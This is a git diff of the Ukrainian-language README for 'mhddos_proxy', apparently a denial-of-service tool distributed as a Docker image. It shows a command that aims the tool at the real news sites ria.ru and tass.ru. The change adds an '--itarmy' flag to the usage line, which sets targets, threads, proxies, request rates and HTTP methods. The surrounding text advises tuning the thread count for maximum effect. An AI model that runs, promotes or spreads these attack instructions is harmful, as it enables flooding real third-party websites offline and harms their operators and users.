@@ -112,7 +112,7 @@ python3 runner.py https://ria.ru https://tass.ru
 Взагалі, загальний вигляд команди виглядає так:
 
 ```sh
-sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy <list of targets> -c <config_file> -t <threads> -p <period> <--debug> <--table> <--vpn> --rpc <n_requests> --proxy-timeout <proxy_timeout>  --http-methods <list of http_methods>
+sudo docker run -it --rm --pull always ghcr.io/porthole-ascend-cinnamon/mhddos_proxy <list of targets> -c <config_file> <--itarmy> -t <threads> -p <period> <--debug> <--table> <--vpn> --rpc <n_requests> --proxy-timeout <proxy_timeout>  --http-methods <list of http_methods>
 ```
 
 Одразу ж прошу Вас звернути увагу на параметр -t й експериментально встановити значення для нього для конкретно Вашої машини й Вашого інтернету.
